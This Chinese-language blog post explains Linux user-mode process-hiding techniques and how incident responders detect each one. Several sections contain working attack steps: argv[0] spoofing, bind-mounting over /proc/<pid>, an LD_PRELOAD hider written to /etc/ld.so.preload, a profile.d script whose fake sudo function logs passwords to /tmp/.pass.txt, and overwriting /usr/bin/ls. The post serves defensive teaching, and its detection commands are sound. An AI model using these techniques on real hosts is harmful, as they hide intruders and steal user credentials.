12 Sep, 2026
|

进程名伪装

攻击原理

攻击者利用 Linux 进程创建时 execve() 对 argv[0] 可控的特性，在启动程序时伪造进程命令行参数，使 /proc/<pid>/cmdline 等用户态接口展示为正常业务名称，从而造成进程展示信息与真实执行文件不一致，达到进程伪装的目的。

实现方案

程序直接运行时，可以使用以下命令将其放入后台：

nohup ./simulation &

默认情况下，通过 ps、top 等基于 procfs 的工具可以看到真实的进程命令信息。 可以通过下面命令把进程伪装成一个java业务，伪装一般会用当前主机跑的真实业务去当做进程命令信息，以降低被发现的概率。

nohup bash -c 'exec -a "java -Xms512m -Xmx1024m -jar app.jar" ./simulation' &

使用 exec -a 启动程序时，Shell 会在调用 execve() 时传入新的 argv[0]。由于 /proc/<pid>/cmdline 的内容来自进程启动参数，因此依赖 cmdline 识别进程名称的工具都可能受到影响。 可以通过以下命令查看 execve() 实际接收的参数:

strace -f -e execve bash -c 'exec -a "java -jar app.jar" ./simulation'

排查方案

可以通过以下脚本查找 procfs 中 comm 与 cmdline 不一致的进程。不过，两者不一致并不一定代表进程遭到伪装，因此该结果只能作为排查线索。

#!/bin/bash
for pid in /proc/[0-9]*; do
    pid=${pid##*/}
    comm=$(cat /proc/$pid/comm 2>/dev/null)
    cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
    if [ -n "$comm" ] && [ -n "$cmdline" ]; then
        if [[ "$cmdline" != *"$comm"* ]]; then
            echo "[!] PID: $pid"
            echo "    comm:    $comm"
            echo "    cmdline: $cmdline"
            echo
        fi
    fi
done

在排查网络连接时，也可以结合活跃连接的源端口和目的端口进行判断。以 SSH 为例，服务器通常监听固定端口，默认为 22，也可能使用其他端口。如果连接使用的源端口不是系统设置的 SSH 监听端口，则说明该连接更可能是本机主动发起的，可以作为一条可疑线索，但不能仅凭端口直接确定存在问题。 此外，如果有其他情报，也可以直接通过内存搜索的方式去确定问题。

进程绑定挂载

攻击原理

攻击者利用 bind mount 替换目标进程的 /proc/<pid> 视图，使依赖 procfs 获取进程信息的工具（如 ps、top 等）读取到伪造或空白内容，从而达到隐藏或伪装进程信息的目的。

实现方案

正常情况下，通过网络连接可以查看到对应的进程信息 可以通过下面命令实现隐藏目的

mkdir -p /home/.hidden
mount -o bind /home/.hidden /proc/9289

隐藏后通过排查网络外联的形式查看，可以发现PID信息已被隐藏，且直接通过ps无法找到进程信息 消失的原因是部分用户态工具（如ps、top 以及依赖 procfs 的工具）通过读取 /proc/<pid> 下的文件获取进程信息。通过 bind mount 将目标进程的 /proc/<pid> 目录覆盖到其他目录后，工具访问该 PID 对应路径时会被重定向到挂载后的内容。如果绑定目标是一个空目录，例如 /home/.hidden，由于缺少 cmdline、status、fd 等 proc 文件，依赖这些信息的工具无法获取完整进程信息，因此可能无法显示该进程。 另一种利用方式是不创建新的目录，而是将一个正常进程的 /proc/<pid> 目录绑定到目标进程对应的目录，例如将 /proc/1 绑定到 /proc/9289。此时工具获取到的是其他进程的信息，从而实现进程信息欺骗，而不是简单隐藏。但是这个针对netstat无效，它并不是完全依赖/procfs，只可能影响 PID 和进程信息的关联。

mount -o bind /proc/1 /proc/9289

排查方案

快速发现异常的手段可以执行下面命令

mount |grep /proc/

但是这个命令只能用来发现异常，回显的信息没有对应绑定路径。 可以通过下面命令查看更详细的挂载信息

cat /proc/self/mountinfo |grep /proc/

也可以通过下面命令发现可疑进程(如果隐匿的方式是进程绑定进程则无效,仅辅助使用)

ls -l /proc | awk '$5 != 0'

确定存在问题并完成取证后，可以通过下面命令解除绑定挂载

umount /proc/9289

进程文件清理

攻击原理

攻击者在恶意程序启动后，通过 unlink() 删除程序对应的磁盘文件，从而减少文件落地痕迹。Linux 内核仍会持有可执行文件对应的 inode 和内存映射，因此文件被删除后进程仍然可以正常运行。此时通过 ps、top 等工具仍可看到进程，但原始路径中的恶意文件已经消失，导致常规手段无法直接获取实际恶意文件。

实现方案

通过查看网络外联的形式，正常情况如下 通过命令unlink <执行程序>可以实现源文件的清理，并且程序的exe已变为deleted，且程序已经在原始目录中清除。

排查方案

这个隐藏手段单独使用时作用有限。虽然可以删除原始文件，但是依旧可以通过 /proc/<PID>/exe 将正在运行的程序复制出来。恢复后的文件无法保留原始文件的真实落地时间，不过可以把进程启动时间作为溯源时的参考节点。恢复命令如下：

cp /proc/PID/exe /to/path

动态链接库劫持

攻击原理

攻击者利用 Linux 动态链接器加载机制，通过 LD_PRELOAD 指定恶意共享库，使目标程序在启动时优先加载攻击者控制的代码，从而实现函数劫持、行为修改或隐藏攻击痕迹。

实现方案

参考项目文件:https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c 项目实际实现是通过 LD_PRELOAD 对 libc 的 readdir 函数进行 hook。当目标程序遍历 /proc 目录获取进程列表时，hook后的 readdir 会判断当前遍历目录是否为 /proc，并读取对应 PID 的进程名称。如果发现进程名称匹配需要隐藏的目标，则通过 continue 跳过该目录项，使调用方无法获取该进程信息，关键代码如下。

            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
                strcmp(process_name, process_to_filter) == 0) {         \
                continue;                                               \
            }                                                           \

本地实现方案可以参考下面命令去构建动态链接库

curl -O https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c # 下载对应代码
sed -i 's/evil_script.py/simulation/' processhider.c # 替换隐藏程序名，根据自己复现程序去替换
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl # 编译动态链接库

对于链接库的使用，可以直接通过LD_PRELOAD变量去直接复现，如下

nohup ./simulation & # 程序运行
ps -aux|grep simulation # 正常情况下直接看进程
LD_PRELOAD=$PWD/libprocesshider.so ps -aux | grep simulation # 加载恶意链接库之后查看进程

结果如下 在真实环境下，攻击者可能会修改 /etc/ld.so.preload，也可能修改 /etc/ld.so.conf 或者在 /etc/ld.so.conf.d/ 目录下创建配置文件。下面以修改 /etc/ld.so.preload 为例，实现对后续启动程序的劫持

cat >>/etc/ld.so.preload<<EOF
/root/simulation/target/release/libprocesshider.so
EOF
ps -aux|grep simulation

结果如下 针对不同的动态链接库配置文件，其生效方式存在一定差异。/etc/ld.so.preload中需要直接指定待加载的 .so 文件，配置写入后，后续启动的动态链接程序会直接受到影响。而 /etc/ld.so.conf 及 /etc/ld.so.conf.d/*.conf 主要用于配置动态链接库的搜索路径。修改这些配置后，需要执行 ldconfig 更新 /etc/ld.so.cache，使新增路径中的动态链接库能够被动态链接器检索。此外，在某些情况下，还会直接隐藏恶意文件的位置，以及隐藏 /etc/ld.so.preload 文件，但实际实现思路基本一致。

排查方案

如果发现异常，但使用系统命令无法进一步定位，可以先使用不依赖系统动态链接库的工具进行辅助排查，例如静态编译的 busybox，以避免排查工具本身受到动态链接库劫持的影响。这类工具最好自己本地准备一份，而不是通过网络下载的形式获取，排查方法如下

wget https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
chmod +x busybox
./busybox ps |grep simulation
./busybox netstat -tnlap

结果如下 然后分别检查 /etc/ld.so.conf、/etc/ld.so.preload 和 /etc/ld.so.conf.d/*，查看其中是否存在可疑的加载内容。使用静态编译的 busybox，主要是为了避免排查工具本身受到动态链接库劫持。如果现场无法上传工具，只能使用系统现有命令，也可以通过 strace 和 ldd 查看程序加载的动态链接库，使用方法如下：

strace -f -e trace=openat ps 2>&1 | grep '\.so'
ldd /usr/bin/ps

这两个方法都可以查看程序实际加载的动态链接库，再根据加载路径判断是否存在异常，结果如下 但是通常恶意的so文件不会出现在过于明显的位置，这通常需要一定的经验去判断。个人认为最好的方式是发现可能存在劫持后，直接使用静态编译的busybox进行排查。需要注意的是，对于已经运行的进程，即使删除了恶意 so 文件、修复了/etc/ld.so.preload、/etc/ld.so.conf、/etc/ld.so.conf.d/*.conf，也无法完全恢复，因为恶意 so 已经被动态链接器映射进这些进程的地址空间，在进程退出前一直有效。正确的做法是先清理恶意文件和配置，再重启系统，才能彻底恢复。

Shell函数劫持

攻击原理

攻击者通过修改 Shell 启动配置文件，在系统加载用户环境时定义与系统命令同名的函数或脚本，从而优先执行恶意逻辑，实现对常用命令的劫持。由于 Shell 会优先匹配函数和别名，用户执行命令时可能无法直接调用原始程序。

实现方案

在/etc/profile.d/目录下创建pass_hijack.sh，写入以下内容：

#!/bin/bash

function ls {
    out=$(command ls "$@")
    out=$(echo "$out" | sed -e '/pass_hijack\.sh/d')
    echo "$out"
}

function sudo {
    read -sp "[sudo] password for $USER: " password
    echo ""
    touch /tmp/.pass.txt 2>/dev/null
    echo "$USER : $password" >> /tmp/.pass.txt
    echo "$password" | /usr/bin/sudo -S "$@"
}

其中，ls函数通过command ls调用原始命令，并过滤结果中的pass_hijack.sh，以隐藏恶意脚本自身。sudo函数则伪造密码提示，记录用户输入的密码后，再调用真实的sudo命令继续执行操作。修改后可以通过source /etc/profile重新加载配置文件，使其生效，需要注意的是，默认用户登录都会自动去加载一遍这个配置，不需要手动去执行即可生效。生效结果如下 除窃取密码外，攻击者还可以在被劫持的命令中加入恶意软件持久化、反向 Shell、敏感信息收集及外传等逻辑，从而扩大攻击影响。

排查方案

在本文的实现方案中，加载后可以明显看到 ls 命令的输出方式发生了变化。正常情况下，ls 会根据终端宽度和文件名长度自动调整排列方式，文件名较短时通常会横向排列，这也可以作为一个排查点。普通场景下可以检查 /etc/profile 和 /etc/profile.d/* 中是否存在可疑命令。如果文件较多，也可以尝试通过命令追踪系统调用或者检查 Shell 中的命令定义来发现问题。不过，这类方式通常需要提前知道哪个命令可能被劫持，在实际环境中并不好发现。系统调用追踪命令为strace -e trace=file -f ls /etc/profile.d/，执行结果如下： 检测Shell执行内容可以通过type -a ls的方式拿到ls命令实际在当前Shell环境下会执行的顺序和内容，结果如下 当发现特定命令存在异常后可以通过以下命令去确认篡改的源文件

shopt -s extdebug
declare -F ls
shopt -u extdebug

执行结果如下 需要注意的是，/etc/profile、/etc/profile.d/只是比较常见的配置位置，并不是固定位置。攻击者也可以通过~/.bashrc、/etc/bash.bashrc等文件加载恶意内容，或者在这些文件中指定其他目录及独立文件。因此，需要结合实际 Shell 类型和启动流程，对相关配置文件及其引用内容进行分析。 如果排查时发现命令的执行结果不对劲，可以使用 busybox 中的对应命令进行对比，绕过当前 Shell 中定义的同名函数。

系统文件篡改

攻击原理

攻击者获取较高权限后，通过替换或修改系统文件，将恶意逻辑植入系统原有功能的执行流程，从而实现权限维持、信息窃取、命令劫持及隐藏攻击痕迹等目的。

实现方案

攻击者通常会直接修改命令或替换现有的动态链接库，例如ls这类常用命令，可以通过下面命令进行替换

echo -e '#!/bin/bash\necho "hello"' > /usr/bin/ls && chmod 755 /usr/bin/ls

执行结果如下 这个时候系统的 ls 命令就已经被篡改了。除此之外，攻击者也可以篡改程序使用的动态链接库，在特定函数中加入恶意逻辑后替换原始的 so 文件。这里不再展开，因为排查方案相同。

排查方案

针对这类情况，如果系统使用 rpm 管理软件包，可以通过命令 rpm -Vf /bin/ls 验证单个文件。当前环境的执行结果如下 出现 S 说明文件大小发生了变化，出现 5 说明文件内容摘要不一致。如果没有发现异常，则不会输出任何内容，参考下图 如果现场发现了问题，但是找不到实际命令也可以通过rpm -Vf /bin/*去验证目录，或者通过rpm -Va全量验证，但是全量的验证就比较久了，并且输出比较全面，不适合直接去看 如果不想要这类冗长的内容，也可以通过命令来去过滤出被篡改过的命令

rpm -Va 2>/dev/null | grep -E '^..5|^missing' | grep -vE '^\S+\s+c\s'

执行结果如下 还有些情况，不需要这些手段也可以发现问题，这种结果明显不正常…… 如果需要恢复，可以通过命令rpm -qf /bin/ls去定位他的具体安装包,运行结果如下 这里就可以直接通过重新安装它来恢复，命令参考如下

yum reinstall -y coreutils

对于使用 deb 的系统，对应操作如下

  • dpkg -S /bin/ls 定位所属包
  • dpkg -V coreutils 校验单个包
  • dpkg -V 做全量校验。校验通过时同样不输出任何内容，只列出异常项；输出格式为 ??5?????? /usr/bin/ls，第三位 5 表示内容不符
  • 可用 dpkg -V | grep -E '^..5' 过滤。
  • apt install --reinstall -y coreutils 重装。 如果实际被入侵主机为不出网环境，则可以通过离线rpm或者deb包安装，这里不多做解释。如果排查时发现系统命令存在异常，也可以使用 busybox 中的对应命令进行对比，避免排查结果受到系统文件篡改的影响。

写在后面

本文只整理了几种常见的用户态隐匿手法，实际环境中的攻击手法远不止这些，而且攻击者通常会组合使用。对于命令替换和劫持这类，如果攻击者伪装得比较好，往往很难直接发现。如果怀疑命令存在异常，或者输出结果不可信，可以使用 busybox 进行交叉验证，再结合网络连接、进程信息、文件完整性和系统日志综合判断。但不建议从一开始就只依赖 busybox，否则可能会忽略其他异常。 本文参考链接如下：
